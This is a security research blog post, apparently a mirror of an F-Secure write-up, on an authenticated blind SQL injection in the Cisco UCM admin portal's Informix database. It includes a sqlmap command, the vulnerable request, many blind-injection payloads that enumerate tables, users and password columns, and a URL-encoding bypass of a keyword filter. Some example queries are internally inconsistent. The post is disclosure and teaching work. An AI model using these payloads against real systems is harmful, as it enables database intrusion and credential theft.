<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Uncommon SQL Database Alert - Informix SQL Injection | YayWebsiteYay (I suck at titles)</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="Uncommon SQL Database Alert - Informix SQL Injection" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Sometimes I want to publish stuff unfiltered." />
<meta property="og:description" content="Sometimes I want to publish stuff unfiltered." />
<link rel="canonical" href="http://localhost:4000/published-research/informix-sql-injection" />
<meta property="og:url" content="http://localhost:4000/published-research/informix-sql-injection" />
<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Uncommon SQL Database Alert - Informix SQL Injection" />
<script type="application/ld+json">
{"@type":"WebPage","headline":"Uncommon SQL Database Alert - Informix SQL Injection","url":"http://localhost:4000/published-research/informix-sql-injection","description":"Sometimes I want to publish stuff unfiltered.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/published-research/">Published Research</a><a class="page-link" href="/cves/">My CVEs</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post">

  <header class="post-header">
    <h1 class="post-title">Uncommon SQL Database Alert - Informix SQL Injection</h1>
  </header>

  <div class="post-content">
    <h4 id="original-post-httpslabsf-securecombloguncommon-sql-database-alert-informix-sql-injection">Original post: <a href="https://labs.f-secure.com/blog/uncommon-sql-database-alert-informix-sql-injection/">https://labs.f-secure.com/blog/uncommon-sql-database-alert-informix-sql-injection/</a></h4>

<h2 id="intro">Intro</h2>

<p>A client was looking to upgrade their Cisco UCM software and wanted assurance that their implementation was configured securely. During the assessment, we had discovered an authenticated SQL Injection issue within the Cisco UCM administrator portal. In most cases, this discovery can be followed up with using SQLMap or other tools to automatically exploit the issue.</p>

<p>Seeing as we were testing within the client’s development environment, we were given permission to perform more aggressive attacks against Cisco UCM. The SQLMap command I originally used was the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali~# sqlmap --level=5 --risk=3 -r request.txt
</code></pre></div></div>

<p>The request file contained something the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /ccmadmin/userGroupFindList.do?searchLimVal3=&amp;searchLimVal4=&amp;whereClause=1*&amp;searchLimVal1=&amp;searchLimVal2=&amp;searchLimVal7=&amp;searchLimVal8=&amp;searchLimVal5=&amp;searchLimVal6=&amp;rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&amp;colCnt=4&amp;searchLimVal0=&amp;lookup=true&amp;rowsPerPage=50&amp;searchLimVal9=&amp;pageNumber=1&amp;recCnt=37&amp;multiple=true HTTP/1.1
Host: &lt;cucm_admin_portal&gt;
Cookies: JSESSIONID=&lt;jsessionid_data&gt;; com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY=&lt;cisco_data&gt;; JSESSIONIDSSO=&lt;jsessionidsso_data&gt;
Accept: text/html
Connection: close  
</code></pre></div></div>

<p>After letting SQLMap do what it does, a database was identified: Informix SQL. Additionally, the method of injection was Blind Boolean. From there, SQLMap can usually be used to enumerate the underlying database and potentially gain access to passwords and sensitive data. However, after using SQLMap to perform those tasks, some issues became apparent:</p>

<ul>
  <li>SQLMap was able to enumerate the name of the current table, but was unable to enumerate other database names and other table names</li>
  <li>SQLMap was able to enumerate the current SQL user name but was also reporting over 1000 users for the underlying database and could not enumerate the other 999 users</li>
  <li>SQLMap was unable to enumerate any information relating to any user’s password within the <code class="language-plaintext highlighter-rouge">applicationuser</code> table</li>
</ul>

<p>The following sections will be used to demonstrate how the root cause of each issue above were identified and how these issues were overcame.</p>

<h2 id="crash-course-in-informix">Crash Course in Informix</h2>

<p>Before continuing, some research was put into learning about Informix SQL.</p>

<p>The following is a quick lesson on the <code class="language-plaintext highlighter-rouge">systables</code> table:</p>

<ul>
  <li>Informix keeps a record of all table information within the table <code class="language-plaintext highlighter-rouge">systables</code></li>
  <li>The different columns within <code class="language-plaintext highlighter-rouge">systables</code> represent different information, such as the column <code class="language-plaintext highlighter-rouge">tabname</code> represents a specific table’s name and the column <code class="language-plaintext highlighter-rouge">tabid</code> represents a specific table’s ID number</li>
  <li>Other information can include the column <code class="language-plaintext highlighter-rouge">ncols</code> which is the number of columns in the table, and the column <code class="language-plaintext highlighter-rouge">nrows</code> which is the number of rows in the table</li>
</ul>

<p>So as an example, let’s assume that a table was named <code class="language-plaintext highlighter-rouge">yaytableyay</code>. To retrieve the <code class="language-plaintext highlighter-rouge">tabid</code> number, the following query could be used:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT tabid FROM systables WHERE tabname = 'yaytableyay'
#Returned 54
</code></pre></div></div>

<p>To take it further, if we wanted to find the number of rows within the <code class="language-plaintext highlighter-rouge">yaytableyay</code> table, we could make the following query:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT nrows FROM systables WHERE tabid = 54
#Returned 15
</code></pre></div></div>

<p>The following is a quick lesson on the <code class="language-plaintext highlighter-rouge">syscolumns</code> table:</p>

<ul>
  <li>Informix keeps a record of all column information within each table</li>
  <li>The different columns within <code class="language-plaintext highlighter-rouge">syscolumns</code> represent different information, such as the column <code class="language-plaintext highlighter-rouge">colname</code> represents the specific column’s name and the column <code class="language-plaintext highlighter-rouge">tabid</code> represents which table the column is assigned to</li>
  <li>Other information can include the column <code class="language-plaintext highlighter-rouge">colno</code> which is the system sequentially assigned value from left to right</li>
</ul>

<p>So as an example, if we wanted to find out the name of the first column within the table <code class="language-plaintext highlighter-rouge">yaytableyay</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT colname FROM syscolumns WHERE tabid = 54 AND colno = 1
#returned "yaycolumnnameyay"
</code></pre></div></div>

<p>Additionally, every table has a hidden column called <code class="language-plaintext highlighter-rouge">rowid</code>. This value is assigned to each row in a table, but is not deleted when a row is deleted. For example, the following query could return no data due to the row being previously deleted:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM yaytableyay WHERE rowid = 1337
#Returned 0 results
</code></pre></div></div>

<p>There is also a chance that a row never even existed. This will still force the database to return the same “0 results” as if the row was deleted. So when using a <code class="language-plaintext highlighter-rouge">rowid</code> as a <code class="language-plaintext highlighter-rouge">WHERE</code> clause, there is no way to differentiate between a row that was deleted and a row that never existed.</p>

<h2 id="enumerating-other-table-names">Enumerating Other Table Names</h2>

<p>One of the best things you can do to troubleshoot any SQLMap issue (or any tool for web application testing) is to proxy the traffic from the tool. In this case, proxying SQLMap through BurpSuite helped identify that whenever SQLMap was instructed to enumerate other table names and database names, the server would always respond with one of the following errors:</p>

<ul>
  <li>ERROR: A subquery has returned not exactly one row.</li>
  <li>ERROR: “NVL” cannot be used in a query</li>
  <li>ERROR: “RTRIM” cannot be used in a query</li>
  <li>ERROR: “LIMIT” cannot be used in a query</li>
  <li>ERROR: “LENGTH” cannot be used in a query</li>
</ul>

<p>The first error “not exactly one row” was Googleable and could be linked back to Informix. The other errors appeared to be generic restrictions that were built into Cisco UCM itself. With those error messages in mind, it would appear that a custom script and/or tool would be required to further exploit this issue.</p>

<p>In order to enumerate each table, a work flow was established:</p>

<ul>
  <li>Figure out how many valid tables were stored within the database</li>
  <li>Enumerate each table name letter by letter</li>
  <li>Enumerate how many rows and columns were in each table</li>
</ul>

<p>To figure out how many valid tables existed, we used the <code class="language-plaintext highlighter-rouge">tabid</code> value. Specifically, we performed some “greater than” and “less than” operations based on the following payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid &gt; 1) &gt; 1
</code></pre></div></div>

<p>The above payload would force the server to return the ASCII value for the first letter of each table name if their <code class="language-plaintext highlighter-rouge">tabid</code> value was more than 1. This of course returned multiple results since there is surely more than 1 table which forced the server to respond with another “Result is more than 1 column” error. However this was expected because the idea that <em>something</em> returned means that <em>something</em> exists. To illustrate this point further, take the following payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(tabname for 1 from 1)) FROM systables WHERE tabid &gt; 100) &gt; 1
</code></pre></div></div>

<p>Now we are looking for tables whose tabid value is greater than 100. If a table does not exist because a tabid value over 100 does not exist, then the server will respond with no data.</p>

<p>So based on this behavior, we can enumerate how many tables are in the underlying database:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid &gt; 1) &gt; 1
#returned "more than 1 row" error
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid &gt; 100) &gt; 1 
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid &gt; 50) &gt; 1 
#returned "more than 1 row" error
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid &gt; 75) &gt; 1 
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid &gt; 65) &gt; 1 
#returned "more than 1 row" error
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid &gt; 74) &gt; 1 
#returned "more than 1 row" error
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 75) &gt; 1 
#returned no data
</code></pre></div></div>

<p>We have now established that the number of tabids within the current database is 75.</p>

<p>Next, establishing table names was required. Utilizing the ASCII value function was still an option, so we used similar logic that was used to establish the number of tables. The following payload would determine if the ASCII value of the first letter of the first table name was greater than 64:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 64
</code></pre></div></div>

<p>From this behavior, we can enumerate what the first letter is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 64
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 96
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 112
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 104
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 100
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 102
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) = 101
#returned some data
</code></pre></div></div>

<p>Based on the above, the first letter of the first table must be an ASCII value of 101, or “e”.</p>

<p>Moving onto the next character in the table name, we would replace:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tabname from 1 for 1
</code></pre></div></div>

<p>With:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tabname from 2 for 1
</code></pre></div></div>

<p>From this point, we can enumerate what the second letter is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 64
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 96
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 112
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 104
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 108
#returned some data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 110
#returned no data
1=1 AND (SELECT ascii(substring(tabname from 1 for 1)) FROM systables WHERE tabid = 1) &gt; 109
#returned some data
</code></pre></div></div>

<p>Based on the above, the ASCII value of the first letter of the first table must be 110, or “m”.</p>

<p>For the sake of this blog post, the table that was enumerated in the above example is “empire”. The rest of the table names could be enumerated using this method.</p>

<p>After enumerating a table name and associating it with a tabid value, we can start to build some column information.</p>

<p>The following query could be used to help figure out how many columns are in the table “empire”:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ncols FROM systables WHERE tabname = 'empire') = 1
#returned no data
1=1 AND (SELECT ncols FROM systables WHERE tabname = 'empire') = 2
#returned no data
1=1 AND (SELECT ncols FROM systables WHERE tabname = 'empire') = 3
#returned no data
1=1 AND (SELECT ncols FROM systables WHERE tabname = 'empire') = 4
#returned some data
1=1 AND (SELECT ncols FROM systables WHERE tabname = 'empire') = 5
#returned no data
</code></pre></div></div>

<p>The following query could be used to help figure out the name of the first column within the “empire” table:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) &gt; 64
#returned some data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) &gt; 96
#returned no data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) &gt; 80
#returned no data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) &gt; 72
#returned some data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) &gt; 76
#returned no data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) &gt; 74
#returned some data
1=1 AND (SELECT ascii(substring(colname from 1 for 1)) FROM syscolumns WHERE tabid = 1 AND colno = 1) = 73
#returned some data
</code></pre></div></div>

<h2 id="enumerating-other-sql-users">Enumerating Other SQL Users</h2>

<p>When SQLMap was trying to enumerate the other SQL users, the table <code class="language-plaintext highlighter-rouge">sysusers</code> was used. And similar to the “enumerating other tables” section of this write up, the server would continue to respond with errors when SQLMap tried to enumerate other users.</p>

<p>In the previous section, we covered how to use the <code class="language-plaintext highlighter-rouge">tabid</code> column as a sequential number system that could be used to enumerate tables. After looking up how the <code class="language-plaintext highlighter-rouge">sysusers</code> table is organized, it was found that there was no viable sequential number system. As per IBM’s official documentation, the following columns make up the <code class="language-plaintext highlighter-rouge">sysusers</code> table:</p>

<ul>
  <li>username</li>
  <li>usertype</li>
  <li>priority</li>
  <li>password</li>
  <li>defrole</li>
</ul>

<p>It was at this point that we used the hidden column <code class="language-plaintext highlighter-rouge">rowid</code> as part of the <code class="language-plaintext highlighter-rouge">WHERE</code> portion of our SQL query. The following example query could be used in enumerating the ASCII value of the first letter of the first username where the <code class="language-plaintext highlighter-rouge">rowid</code> was 1:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 1) &gt; 1
#returned data
</code></pre></div></div>

<p>After enumerating the first username, we can proceed to enumerate the other usernames based on the <code class="language-plaintext highlighter-rouge">rowid</code> value:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 2) &gt; 1
#returned data
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 3) &gt; 1
#returned data
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 4) &gt; 1
#returned data
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5) &gt; 1
#returned data
</code></pre></div></div>

<p>It gets interesting when the <code class="language-plaintext highlighter-rouge">rowid</code> value reaches reaches the 5000s:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5000) &gt; 1
#returned no data
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5001) &gt; 1
#returned no data
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5002) &gt; 1
#returned some data
</code></pre></div></div>

<p>To help resolve this, the <code class="language-plaintext highlighter-rouge">nrows</code> column in the <code class="language-plaintext highlighter-rouge">systables</code> table could be used to help establish when we have found a valid user. This is because the <code class="language-plaintext highlighter-rouge">nrows</code> value is determined based on the number of non-empty rows in a table.</p>

<p>The following query could help determine the number of rows in the <code class="language-plaintext highlighter-rouge">sysusers</code> table:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT nrows FROM systables WHERE tabname = 'sysusers') &gt; 1
#returned some data
</code></pre></div></div>

<p>Using this query, we can determine that the number of rows with data in the <code class="language-plaintext highlighter-rouge">sysusers</code> table was 1000:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT nrows FROM systables WHERE tabname = 'sysusers') = 1000
#returned data
</code></pre></div></div>

<p>With this in mind, we can start using <code class="language-plaintext highlighter-rouge">rowid</code> and <code class="language-plaintext highlighter-rouge">ncols</code> to enumerate all the usernames within the <code class="language-plaintext highlighter-rouge">sysusers</code> table. By incrementing the <code class="language-plaintext highlighter-rouge">rowid</code>, we can cycle through queries and every time a query returns data, we reduce the <code class="language-plaintext highlighter-rouge">ncols</code> value by 1:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5000) &gt; 1
#returned no data, ncols value is at 444
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5001) &gt; 1
#returned no data, ncols value is at 444
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 5002) &gt; 1
#returned data, ncols value is at 443
...
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 7850) &gt; 1
#returned data, ncols value is at 2
1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 7851) &gt; 1
#returned data, ncols value is at 1
</code></pre></div></div>

<p>With a set of known rowids with non-empty rows, we can now start to enumerate usernames without having to run any custom scripts indefinitely:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(username from 1 for 1)) FROM sysusers WHERE rowid = 7851) &gt; 1
#returned data
</code></pre></div></div>

<h2 id="enumerating-user-passwords">Enumerating User Passwords</h2>

<p>As previously stated, the <code class="language-plaintext highlighter-rouge">sysusers</code> table contained a row called <code class="language-plaintext highlighter-rouge">password</code>. It was also found that the Cisco UCM software utilized the table <code class="language-plaintext highlighter-rouge">applicationuser</code> to store users related to the Cisco UCM software, which also contained a “password row”.</p>

<p>Using the previously discussed techniques, it should have been possible to enumerate the entire <code class="language-plaintext highlighter-rouge">app_users</code> table…that is, until the following query:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(password from 1 for 1)) FROM applicationuser WHERE rowid = 500) &gt; 1
#returned error "Security Exception"
</code></pre></div></div>

<p>That is a weird error message, and not very Googleable. After some testing, it was determined that the server would only respond with that error when trying to enumerate the <code class="language-plaintext highlighter-rouge">password</code> column in any table. Based on this behavior, we had assumed that it was a blacklist keyword situation at the application level.</p>

<p>And we were right! All I had to do was URL encode <code class="language-plaintext highlighter-rouge">password</code> to get past this issue:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1=1 AND (SELECT ascii(substring(%70%61%73%73%77%6f%72%64 from 1 for 1)) FROM app_users WHERE rowid = 500) &gt; 1
#returned data
</code></pre></div></div>

<h2 id="custom-scripts">Custom Scripts</h2>

<p>SQL Map could not be used to exploit this issue, so F-Secure resorted to creating two scripts to fully exploit this issue. Since this issue requires authenticated access to the Cisco UCM administrative console, both scripts require the user to submit their session cookies.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">sql_injection_enumerate_tables.py</code> - enumerates the name of each table on the database and stores them in a file called <code class="language-plaintext highlighter-rouge">cisco_tables.txt</code></li>
  <li><code class="language-plaintext highlighter-rouge">sql_injection_extract_table.py</code> - reads the entries in <code class="language-plaintext highlighter-rouge">cisco_tables.txt</code> and enumerates the contents of each table entry</li>
</ul>

<p>Both scripts don’t automatically URL encode specific words that would trigger a security alert, such as <code class="language-plaintext highlighter-rouge">password</code>. It is recommended that the scripts are proxied through BurpSuite or some other proxy tool that URL encodes words that might trigger security alerts.</p>

<h2 id="vendor-patching">Vendor Patching</h2>

<p>The techniques described in this blog post were used to enumerate the entire database of Cisco UCM version 11.5.1.14900-11. Cisco was informed of this issue and patches are currently in development. A joint disclosure date was agreed upon for 20 November 2019.</p>

<h2 id="links-and-references">Links and References</h2>

<ul>
  <li>F-Secure’s official advisory for this issue that affects certain installations of Cisco UCM can be found here: <a href="https://labs.f-secure.com/advisories/cisco-ucm-informix-sql-injection">https://labs.f-secure.com/advisories/cisco-ucm-informix-sql-injection</a>
    <ul>
      <li>Backup advisory: <a href="/cves/cve-2019-15972.html">https://yogehi.github.io/cves/cve-2019-15972.html</a></li>
    </ul>
  </li>
  <li>Scripts that were developed to fully exploit this issue can be found here: <a href="https://github.com/Yogehi/Cisco-UCM-SQLi-Scripts">https://github.com/Yogehi/Cisco-UCM-SQLi-Scripts</a></li>
</ul>

  </div>

</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:Fake_email_link">Fake_email_link</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Sometimes I want to publish stuff unfiltered.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
